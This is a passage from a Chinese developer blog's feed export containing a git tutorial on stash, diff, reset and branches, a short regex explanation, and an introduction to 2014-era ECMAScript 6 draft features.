class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> <span class="built_in">test</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">初始化 git</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">it init</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">新建四个文件</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">touch</span> f1 f2 f3 f4</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面初始化一个 git ，然后新建了四个文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改 f1</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&quot;1&quot;</span> &gt; f1</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将修改 push 到 stash 栈堆中</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git stash</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面修改了文件 f1，并保存到场景栈堆中</p><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看 stash 栈堆</span></span><br><span class="line">$ git stash <span class="built_in">list</span></span><br><span class="line">  stash@&#123;<span class="number">0</span>&#125;: WIP <span class="keyword">on</span> master: <span class="number">7</span>f58be2 <span class="number">3</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查看栈堆，可以看到 stash@{0}</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改 f2</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&quot;1&quot;</span> &gt; f2</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加修改</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git add .</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将修改 push 到 stash 栈堆中</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git stash</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>修改文件 f2，添加之后保存到栈堆之中</p><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看 stash 栈堆</span></span><br><span class="line">$ git stash <span class="built_in">list</span></span><br><span class="line">    stash@&#123;<span class="number">0</span>&#125;: WIP <span class="keyword">on</span> master: <span class="number">7</span>f58be2 <span class="number">3</span></span><br><span class="line">    stash@&#123;<span class="number">1</span>&#125;: WIP <span class="keyword">on</span> master: <span class="number">7</span>f58be2 <span class="number">3</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>栈堆中多了一个 stash@{1}，这个时候我们去修复 bug，改变其他位置的代码，完了之后：</p><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="meta"># pop 栈堆，还原修改</span></span><br><span class="line">$ git stash <span class="keyword">pop</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面我们将栈堆 pop 出来，遵循后进先出的规则</p><figure class="highlight nestedtext"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看文件状态</span></span><br><span class="line"><span class="attribute">git status</span></span><br><span class="line"><span class="attribute">$ Changes not staged for commit</span><span class="punctuation">:</span></span><br><span class="line">    <span class="attribute">changed</span><span class="punctuation">:</span> <span class="string">f2</span></span><br><span class="line">  please commit it</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以上代码都是我手动敲出来的，不是复制控制台的代码，大概就是这个么意思吧。关于 stash 的最后一个想说明的命令是：</p><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">git stash clear</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>清空场景（stash）堆栈。</p><h4>2. 代码 diff</h4><p><strong>2.1 HEAD</strong></p><p>在介绍这块之前，也需要先了解几个基本的常识：</p><blockquote><p><strong>HEAD</strong>&nbsp; &nbsp; &nbsp;它表示上一次的 commit 版本</p><p><strong>HEAD~n</strong> 它表示第上 n 词的 commit 版本，这里的 n 是大于等于 1 的整数</p></blockquote><p>如果我们要比较上一次和这一次代码之间的差异，可以：</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">git</span> diff HEAD~<span class="number">1</span> HEAD</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>比较前第三次与现在代码的差异，可以：</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">git</span> diff HEAD~<span class="number">3</span> HEAD</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>获取前第n次的还有另外一种方式，如前第二次：</p><figure class="highlight latex"><table><tr><td class="code"><pre><span class="line">HEAD^^</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>前第五次：</p><figure class="highlight latex"><table><tr><td class="code"><pre><span class="line">HEAD^^^^^</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样写起来比较累，还是前面的方式比较顺手。</p><p><strong>2.2 SHA</strong></p><p>关于 SHA 标识的介绍，我这里就懒得打字了，可以看我之前分享的<a href="http://hi.barretlee.com/2014/04/28/git-roll-back/" target="_blank">一点东西</a>，使用</p><figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">log</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到每次 commit 的 SHA 标识。要比较两次提交之间的差异，可以直接</p><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">git <span class="keyword">diff </span><span class="keyword">SHA1 </span><span class="keyword">SHA2</span></span><br><span class="line"><span class="keyword"></span></span><br></pre></td></tr></table></figure><p>其中 SHA1 和 SHA2 是两次提交（commit）时的标识。</p><p><strong>2.3 与场景的比较</strong></p><p>这个用的比较少，对比目前代码跟最近一次 push 的场景代码差异：</p><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">git <span class="keyword">diff </span>--<span class="keyword">cached</span></span><br><span class="line"><span class="keyword"></span></span><br></pre></td></tr></table></figure><p>从字面上也好理解，就是跟缓存的文件做对比嘛~</p><h4>3. 版本回退</h4><p>如果上面的 SHA，working，index，commit 几种状态和标识没有弄明白，相信这里也是十分难理解的。</p><p>版本回退使用的命令是：</p><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">git reset</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>3.1 三种操作</strong></p><p>这个命令后面是要加参数的，分别为：</p><p><strong>a) filename</strong></p><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">git <span class="keyword">reset</span> HEAD filename  <span class="comment"># 从暂存区移除文件</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果之前有 add filename，上面的命令操作之后，filename 将处于未被 add 的状态。也就是从 index 转变成 working 状态。</p><p><strong>b) HEAD</strong></p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">git <span class="keyword">reset</span> <span class="comment">--hard HEAD~n</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接回退到前第 n 个版本。</p><p><strong>c) SHA</strong></p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">git <span class="keyword">reset</span> <span class="comment">--hard SHA</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>回到 SHA 对应的 commit 的版本。</p><p><strong>3.2 三种方式</strong></p><p>上面我们使用的是 <code>--hard</code> 来 reset 代码，这样风险是特别大的，这里有三个可选参数：</p><ul><li><code>--hard</code> 回退版本，代码也回退，忽略所有修改</li><li><code>--soft</code> 回退版本，代码不变，回退所有的 add 操作</li><li><code>--mixed</code> 回退版本，代码不变，保留 add 操作</li></ul><h4>4. 分支处理</h4><p><strong>4.1 查看分支</strong></p><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">git branch</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这是最简单的查看，查看本地创建了哪些分支。</p><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">git branch -va</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查看本地+远程分支，及其详细信息（上次提交commit信息）</p><p><strong>4.2 添加分支</strong></p><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">git <span class="keyword">branch </span><span class="keyword">branch_name</span></span><br><span class="line"><span class="keyword"></span></span><br></pre></td></tr></table></figure><p>如果你当前所在的分支是 master，此处创建的分支会直接继承 master 的所有修改历史。</p><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">git <span class="keyword">branch </span>-<span class="keyword">b </span><span class="keyword">branchnew </span><span class="keyword">branchold</span></span><br><span class="line"><span class="keyword"></span></span><br></pre></td></tr></table></figure><p><code>-b</code> 是 base 的意思，如果你有两个分支 A 和 B ，目前在 A 分支上，你先新建一个分支继承 B，此刻你有两个选择：</p><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 选择一</span></span><br><span class="line"><span class="comment"># 先切换到 B 分支上</span></span><br><span class="line">git checkout <span class="keyword">B</span></span><br><span class="line"><span class="keyword"></span>git <span class="keyword">branch </span>C</span><br><span class="line"></span><br><span class="line"><span class="comment"># 选择二</span></span><br><span class="line">git <span class="keyword">branch </span>-<span class="keyword">b </span>C <span class="keyword">B</span></span><br><span class="line"><span class="keyword"></span></span><br></pre></td></tr></table></figure><p><strong>4.3 切换分支</strong></p><p><strong>a) 切换到本地分支</strong></p><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">git checkout branch_name</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>b) 切换到远程分支</strong></p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">git checkout remotes<span class="regexp">/origin/</span>branch_name</span><br><span class="line">git checkout branch_name</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>详情请看之前分享的这篇文章，<a href="http://hi.barretlee.com/2014/04/30/switch-branch-in-git/" target="_blank">git切换到远程分支</a></p><p><strong>4.4 删除分支</strong></p><p>显切换到别的分支上，然后</p><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">git <span class="keyword">branch </span>-d <span class="keyword">branch_name</span></span><br><span class="line"><span class="keyword"></span></span><br></pre></td></tr></table></figure><p>如果是远程分支：</p><figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">push</span> <span class="built_in">origin</span> :branch_name</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在需要删除的分支前面加一个冒号OK了，push 上去之后，服务器上的分支自然就被删除了。</p><hr><p><strong><span>由于想写的内容实在太长，故打算下次再补充第二部分。</span></strong></p><p>下期预告：</p><blockquote><p> <strong>本节补充：</strong>    　　5. tag处理   　　6. 仓库管理  <strong>第三章 版本管理策略</strong>     <strong>第四章 看懂 diff</strong>     <strong>第五章 配置别名</strong> </p></blockquote><p>下次再做小结。</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则中分支示例</title>
      <link href="/blog/2014/05/04/branch-in-regexp/"/>
      <url>/blog/2014/05/04/branch-in-regexp/</url>
      
        <content type="html"><![CDATA[<p><strong>问题：</strong></p><pre><code>&quot;baddad&quot;.match(/([bd]ad?)*/)</code></pre><p>为什么匹配的是dad而不是bad。</p><p><strong>回答：</strong></p><p>不是不匹配bad，而是已经匹配过了，* 号为贪婪模式，所以第一次匹配到 bad 之后会继续往后吞并字符，最后发现后面还有一个 dad 也适合，于是便把 baddad 全部匹配了，第二次匹配是分支匹配，前面的 [bd] 是两个分支，刚才第一个分支已经匹配完了，进入第二个分支<br>，也就是匹配 dad，所以第二个结果是dad就显而易见了。</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 正则 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ECMAScript 6入门</title>
      <link href="/blog/2014/05/02/cb-ecmascript6-overview/"/>
      <url>/blog/2014/05/02/cb-ecmascript6-overview/</url>
      
        <content type="html"><![CDATA[<p>预计在2014年底，ECMAScript 6将会正式发布，他的草案在13年3月份被冻结，后续提出新特性将会移至ECMASript 7中。目前还没有哪款浏览器实现了ES6的全部内容，兼容性最强的一款要数FireFox了。具体情况可以在<a href="http://kangax.github.io/es5-compat-table/es6/" target="_blank">这里</a>查看。</p><p>关于 ECMAScript 6 草案，我在博客里头复制了一份，可以点击<a href="http://barretlee.com/ST/ES6/" target="_blank">这里</a>。</p><p>JavaScript的内容是越来越丰富，在ES6中还添加了模块（module）和类（class），感觉他已经失去了曾经的单纯了，不知道这些新功能的补充对开发者来说是福音还是负担。之前写过两篇关于ES6的文章，<a href="http://www.cnblogs.com/hustskyking/p/ES6-introduce.html">ECMAScript 6 简介</a> 和 <a href="http://www.cnblogs.com/hustskyking/p/ES6-computed-properties.html">ECMAScript 6中的let和const关键词</a>，本文将一一介绍ES6中的一些新特性。</p><p><strong>注意：如果想测试以下属性，请安装 0.11+ 版本的 node，并添加上 --harmony 参数。</strong></p><h3>一、let 和 const</h3><p>这个内容在 <a href="http://www.cnblogs.com/hustskyking/p/ES6-computed-properties.html">ECMAScript 6中的let和const关键词</a>&nbsp;一文中已经介绍过了。简单来说就是一句话：ES6中引入了块级作用域，let的有效区间是他所在的 <code>&#123;&#125;</code> 大括号中。const 为常量，定义之后不能更改，也删除不了。</p><figure class="highlight processing"><table><tr><td class="code"><pre><span class="line">&gt; <span class="keyword">const</span> <span class="literal">PI</span> = <span class="number">3.14</span>;&gt; <span class="built_in">Object</span>.<span class="property">getOwnPropertyDescriptor</span>(window, <span class="literal">PI</span>)</span><br><span class="line"><span class="built_in">Object</span> &#123;value: <span class="number">3.1415</span>, writable: <span class="literal">false</span>, enumerable: <span class="literal">true</span>, configurable: <span class="literal">false</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>writable 和 configurable 都是 false。</p><h3>二、多变量的模式赋值</h3><p>写过 coffee-script 的人都知道，我们可以这样给一个数据赋值：</p><figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">num[<span class="number">1.</span><span class="number">.3</span>] = [<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;i&#x27;am&quot;</span>, <span class="string">&quot;Barret Lee&quot;</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ES6中也允许类似的多变量赋值：</p><figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">var [x, y, z] = [<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;i&#x27;am&quot;</span>, <span class="string">&quot;Barret Lee&quot;</span>];</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>更强大的是，他还适合对象：</p><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">var &#123; foo, <span class="keyword">bar </span>&#125; = &#123; foo: <span class="string">&quot;Barret&quot;</span>, <span class="keyword">bar: </span><span class="string">&quot;Lee&quot;</span> &#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这种赋值方式是模式匹配的，只要左侧跟右侧对应，便可以成功赋值。感觉新手不会太适应这种写法。</p><h3>三、数组推导</h3><p>先看例子：</p><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">var</span> <span class="built_in">a1</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]<span class="comment">;</span></span><br><span class="line"><span class="symbol">var</span> <span class="built_in">a2</span> = [i * <span class="number">2</span> for (i of <span class="built_in">a1</span>)]<span class="comment">;</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">a2</span> <span class="comment">// [2, 4, 6, 8]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这东西只是简化了编程，没有从根本上增加功能和特性，写 coffee 的人应该比较喜欢，我看着还是有点不习惯，其实上面的写法就等价于：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="keyword">var</span> a2 = a1.<span class="built_in">map</span>(<span class="keyword">function</span> (<span class="params">i</span>) &#123; <span class="keyword">return</span> i * <span class="number">2</span> &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我想除非是代码长度有限制，否则这玩意儿正式出来了我也不会用它。</p><h3>四、字符串的扩展</h3><p>这一块的内容相当于是给 JS 编码打一个补丁，这个补丁用来弥补双字节 UTF-16 字符带来的问题，引入的各个函数也只是对不同场景的修复。这个扩展还是相当重要的，尤其是 ArrayBuffer 中数据类型的相关处理，涉及到很多类似 Float64Array Uint32Array 等类型化数组的处理，我在 <a href="http://www.cnblogs.com/hustskyking/p/javascript-array.html">你所不知道的JavaScript数组</a> 曾提到过。</p><h4>1. codePointAt</h4><p>这个地方需要解释下 JavaScript 对字符的储存模式，JavaScript 中的字符串是以 UTF-16 为代码单元，通常我们使用的字符范围都在 Unicode 值 0x10000 以内，他们对应的 UTF-16 就是它们自身，但 Unicode 中也存在这个范围之外的字符，这时候就需要两个 UTF-16 字符来描述，比如：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">alert(<span class="string">&quot;𠐀&quot;</span>.<span class="built_in">length</span>); <span class="comment">//2</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>因为字符串的 length 表示的并不是字符个数，而是 UTF-16 的单元个数。关于这方面知识的具体介绍，可以戳<a href="http://www.web-tinker.com/article/20468.html" target="_blank">这里</a>。</p><p>ES6提供了 codePointAt 函数来正确处理 4 个字节储存的字符。</p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">var s <span class="operator">=</span> <span class="string">&quot;𠐀二&quot;</span><span class="comment">;</span></span><br><span class="line">s.codePointAt(<span class="number">0</span>)<span class="comment">;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>codePointAt 会把 s 中的两个字符都正确解析出来，相当于智能的将储存单元切换为 2 或者 4.</p><h4>2. fromCodePoint</h4><p>对应 String.fromCharCode 的能够智能解析 s 的函数是 String.fromCodePoint</p><h4>3. 字符的Unicode表示法</h4><p>我们知道可以使用 \u0000-\uFFFF 来表示一个 Unicode 字符，依然是上面的问题，如果字符超出了这个范围，比如 "\u10000" 这个字符，便不能正确的解析出来，ES6中可以这样：</p><figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#\u&#123;10000&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用大括号括起来就可以正常解析超过 FFFF 的字符了。</p><h4>4. 正则修饰符 u</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/^.$/</span>.test(<span class="string">&quot;𠐀&quot;</span>) <span class="regexp">//</span> false</span><br><span class="line"><span class="regexp">/^..$/</span>.test(<span class="string">&quot;𠐀&quot;</span>) <span class="regexp">//</span> true</span><br><span class="line"><span class="regexp">/^.$/u</span>.test(<span class="string">&quot;𠐀&quot;</span>) <span class="regexp">//</span> true</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看到上面三个测试，相信你已经知道是什么意思了。</p><h4>5. 几个没啥意思的函数</h4><p>contains(), startsWith(), endsWith(), repeat()</p><p>都是对 String 的拓展，顾名就能思意。</p><h4>6. 模板字符串</h4><p>之前写过一篇关于 TEMPLATE 标签的<a href="http://i.cnblogs.com/javascript-template-tag">文章</a>，这里我们又看到了一个跟模板相关的东西。</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 字符串中嵌入变量</span></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">&quot;Bob&quot;</span>, time = <span class="string">&quot;today&quot;</span>;</span><br><span class="line"><span class="string">`Hello <span class="subst">$&#123;name&#125;</span>, how are you <span class="subst">$&#123;time&#125;</span>?`</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> y = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">`<span class="subst">$&#123; x &#125;</span> + <span class="subst">$&#123; y &#125;</span> = <span class="subst">$&#123; x + y&#125;</span>`</span>)</span><br><span class="line"><span class="comment">// &quot;1 + 2 = 3&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>配合 TEMPLATE 标签使用是比较方便的，不过 TEMPLATE 标签可以很方便的使用自定义标签，这个特性也不是很突出了。</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;test&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">x-from</span>&gt;</span>DOM文档<span class="tag">&lt;/<span class="name">x-from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">x-name</span>&gt;</span>test元素<span class="tag">&lt;/<span class="name">x-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&quot;temp&quot;</span>&gt;</span></span><br><span class="line">  我是来自 <span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">content</span> <span class="attr">select</span>=<span class="string">&quot;x-from&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">content</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line">  中的 <span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">content</span> <span class="attr">select</span>=<span class="string">&quot;x-name&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">content</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line">  的数据。</span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> root = test.<span class="title function_">webkitCreateShadowRoot</span>();</span></span><br><span class="line"><span class="language-javascript">root.<span class="title function_">appendChild</span>(<span class="variable language_">document</span>.importNode(temp.<span class="property">content</span>));</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3>五、数值的扩展</h3><h4>1. 二进制和八进制表示法</h4><figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line"><span class="number">0b111110111</span> === <span class="number">503</span> // <span class="literal">true</span></span><br><span class="line"><span class="number">0o767</span> === <span class="number">503</span> // <span class="literal">true</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>前缀 0b 和 0o 表示二进制和八进制数值</p><h4>2. 扩展函数</h4><ul><li>Number.isFinite()</li><li>Number.isNaN()</li><li>Number.parseInt()</li><li>Number.parseFloat()</li><li>Number.isInteger()</li></ul><p>具体细节可以去 <a href="//developer.mozilla.org/en/" target="_blank">MDN</a> 上搜查。</p><h3>六、对象的扩展</h3><p>在 ES5.1 中我们看到了 Object 的灵活性提高了很多，加入了 create、defineProperty、freeze 等等很多十分有用的方法，而在 ES6 中，依然继续加强：</p><h4>1. <code>Object.is()</code></h4><p>比较严格相等，传入两个参数，其功能跟 <code>===</code> 差不多，不同的是：+0不等于-0，NaN与本身恒等</p><figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line">+<span class="number">0</span> === <span class="number">-0</span> //<span class="literal">true</span></span><br><span class="line"><span class="literal">NaN</span> === <span class="literal">NaN</span> <span class="regexp">//</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.<span class="keyword">is</span>(+<span class="number">0</span>, <span class="number">-0</span>) <span class="regexp">//</span> <span class="literal">false</span></span><br><span class="line"><span class="built_in">Object</span>.<span class="keyword">is</span>(<span class="literal">NaN</span>, <span class="literal">NaN</span>) <span class="regexp">//</span> <span class="literal">true</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4>2. proto属性</h4><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">obj.__proto__</span> = otherObj<span class="comment">;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这东西浏览器早就实现了，只是在 ES6 才被纳入标准中，还记得这东西被用来判断是否为 IE 么：</p><figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> isIE = <span class="string">&quot;__proto__&quot;</span> <span class="keyword">in</span> &#123;&#125; ? <span class="literal">false</span> : <span class="literal">true</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4>3. 增强的对象写法</h4><p>又是一个装饰品：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Person</span> = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;Barret Lee&#x27;</span>,</span><br><span class="line"></span><br><span class="line">  <span class="comment">//等同于birth: birth</span></span><br><span class="line">  birth,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 等同于hello: function ()...</span></span><br><span class="line">  <span class="title function_">hello</span>(<span class="params"></span>) &#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;My Name Is&#x27;</span>, <span class="variable language_">this</span>.<span class="property">name</span>); &#125;</span><br><span class="line"></span><br><span class="line">&#125;; </span><br><span class="line"></span><br></pre></td></tr></table></figure><h4>4. 允许变量渗入 key 中</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">var name = <span class="string">&quot;my name&quot;</span>;</span><br><span class="line">var Me = &#123;</span><br><span class="line">    [name]: <span class="string">&quot;Barret Lee&quot;</span>,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;李靖&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line">Me[name]       <span class="regexp">//</span> <span class="string">&quot;Barret Lee&quot;</span></span><br><span class="line">Me[<span class="string">&quot;my name&quot;</span>]  <span class="regexp">//</span> <span class="string">&quot;Barret Lee&quot;</span></span><br><span class="line">Me[<span class="string">&quot;name&quot;</span>]     <span class="regexp">//</span> <span class="string">&quot;李靖&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>挺方便的，不过容易出错，比如上面，看晕了吧~</p><h4>5. Symbol</h4><p>一种从类型上区分数据的工具，他是一个原始类型的值，不是对象，很适合做标识符。</p><h4>6. Proxy</h4><p>Proxy 内置的一个代理工具，使用他可以在对象处理上加一层屏障：</p><figure class="highlight qml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> plain = &#123;</span><br><span class="line">    <span class="attribute">name</span> : <span class="string">&quot;Barret Lee&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> proxy = <span class="keyword">new</span> <span class="built_in">Proxy</span>(plain, &#123;</span><br><span class="line">    <span class="attribute">get</span>: <span class="function"><span class="keyword">function</span>(<span class="params">target, property</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">property</span><span class="string"> in target ? target[property] </span>: <span class="string">&quot;我擦&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">proxy.name <span class="comment">// &quot;Barret Lee&quot;</span></span><br><span class="line">proxy.title <span class="comment">// &quot;我擦&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Proxy(target, handler), 这里的 handler 可以是 set get has hasOwn keys 等等方法，具体可以移步这里：<a href="http://wiki.ecmascript.org/doku.php?id=harmony:direct_proxies" target="_blank">http://wiki.ecmascript.org/doku.php?id=harmony:direct_proxies</a></p><h3>七、函数的扩展</h3><h4>1. 参数设置默认值</h4><figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Point</span><span class="params">(x = 0, y = 0)</span> &#123;</span><br><span class="line">   <span class="keyword">this</span>.x = x;</span><br><span class="line">   <span class="keyword">this</span>.y = y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> Point();</span><br><span class="line"><span class="comment">// p = &#123; x:0, y:0 &#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>他这个参数可以初始化相当于暴露更多的底层接口吧，提高了函数的拓展性。</p><h4>2. rest运算符（...）</h4><figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">add</span><span class="params">(<span class="rest_arg">...values</span>)</span> &#123;</span><br><span class="line">    let sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">var</span> val of values) &#123;</span><br><span class="line">      sum += val;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line">add(<span class="number">1</span>, <span class="number">2</span> ,<span class="number">3</span>)  <span class="comment">// 6</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的 values 需要用 val of values 来遍历。</p><h4>3. 箭头函数（=&gt;）</h4><p>之前写过 coffee ，所以对这个我还是比较熟悉的：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;<span class="keyword">return</span> a + b&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个跟上面提到的一些内容一样，都是装饰性的，没太多用途。</p><h3>八、Set和Map数据结构</h3><h4>1. 